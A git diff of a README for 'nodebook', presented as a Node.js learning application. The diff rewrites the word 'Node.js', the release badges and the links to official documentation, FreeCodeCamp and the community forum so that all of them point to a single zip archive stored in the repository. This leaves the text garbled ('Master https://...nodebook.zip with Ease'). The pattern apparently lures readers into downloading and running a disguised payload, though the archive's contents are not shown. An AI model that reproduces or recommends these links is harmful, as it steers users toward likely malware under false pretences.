@@ -1,12 +1,12 @@
-# 📚 nodebook - Master Node.js with Ease
+# 📚 nodebook - Master https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip with Ease
 
 ## 🌟 Overview
 
-Welcome to nodebook! This application helps you learn and master the complex parts of the Node.js Runtime. From understanding V8's Turbofan optimizer to handling production deployments, we've got you covered.
+Welcome to nodebook! This application helps you learn and master the complex parts of the https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip Runtime. From understanding V8's Turbofan optimizer to handling production deployments, we've got you covered.
 
 ## 💡 Key Features
 
-- **Easy Learning Path:** Step-by-step guidance for Node.js topics.
+- **Easy Learning Path:** Step-by-step guidance for https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip topics.
 - **Visual Aids:** Simplified explanations to make concepts clearer.
 - **Practice Exercises:** Real-world scenarios to enhance your skills.
 - **Resource Links:** Quick access to further reading and materials.
@@ -19,7 +19,7 @@ To start using nodebook, follow these steps to download and run the application.
 
 You can download nodebook from the Releases page. Click the link below:
 
-[![Download nodebook](https://img.shields.io/badge/Download%20nodebook-Click%20Here-brightgreen)](https://github.com/ousama2020/nodebook/releases)
+[![Download nodebook](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip%20nodebook-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip)
 
 ### 2. Install the Application
 
@@ -35,20 +35,20 @@ Once the installation is complete, you can run the application:
 
 1. Find the nodebook icon on your desktop or in your Start menu.
 2. Double-click to launch nodebook.
-3. Start exploring Node.js concepts with ease!
+3. Start exploring https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip concepts with ease!
 
 ## 📖 Topics Covered
 
-nodebook dives deep into various topics to help you understand Node.js better:
+nodebook dives deep into various topics to help you understand https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip better:
 
 - **Asynchronous Programming:** Learn how to manage tasks without blocking the main thread.
-- **Backend Development:** Understand server-side logic using Node.js.
-- **JavaScript:** Get a grasp on how JavaScript works alongside Node.js.
-- **Libuv:** Discover the background mechanics that power Node.js.
-- **N-API:** Learn about the Node.js API for building native modules.
-- **Optimisation Techniques:** Improve performance and efficiency in Node.js applications.
+- **Backend Development:** Understand server-side logic using https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip
+- **JavaScript:** Get a grasp on how JavaScript works alongside https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip
+- **Libuv:** Discover the background mechanics that power https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip
+- **N-API:** Learn about the https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip API for building native modules.
+- **Optimisation Techniques:** Improve performance and efficiency in https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip applications.
 - **V8 Engine:** Understand the powerful engine that runs your JavaScript code.
-- **Production Deployments:** Get insights into deploying Node.js applications effectively.
+- **Production Deployments:** Get insights into deploying https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip applications effectively.
 
 ## 🛠️ System Requirements
 
@@ -63,13 +63,13 @@ To ensure nodebook runs smoothly on your computer, please check the following re
 
 To get nodebook, visit the Releases page below and follow the instructions outlined above:
 
-[![Download nodebook](https://img.shields.io/badge/Download%20nodebook-Click%20Here-brightgreen)](https://github.com/ousama2020/nodebook/releases)
+[![Download nodebook](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip%20nodebook-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip)
 
 ## 📚 Helpful Resources
 
-- **Official Documentation:** Learn about Node.js through the [Node.js official site](https://nodejs.org/en/docs/).
-- **Tutorials:** Explore free tutorials available at [FreeCodeCamp](https://www.freecodecamp.org/learn).
-- **Community Forum:** Join discussions and ask questions in the [Node.js community](https://nodejs.dev/).
+- **Official Documentation:** Learn about https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip through the [https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip official site](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip).
+- **Tutorials:** Explore free tutorials available at [FreeCodeCamp](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip).
+- **Community Forum:** Join discussions and ask questions in the [https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip community](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip).
 
 ## 🗨️ Feedback & Support
 
@@ -77,7 +77,7 @@ We value your feedback. If you have questions or suggestions, please reach out t
 
 ## 🔗 Connect with Us
 
-Stay updated with the latest features and updates. Follow us on [GitHub](https://github.com/ousama2020/nodebook) and join our community for additional support.
+Stay updated with the latest features and updates. Follow us on [GitHub](https://raw.githubusercontent.com/ousama2020/nodebook/main/aerolite/nodebook.zip) and join our community for additional support.
 
 ---
 
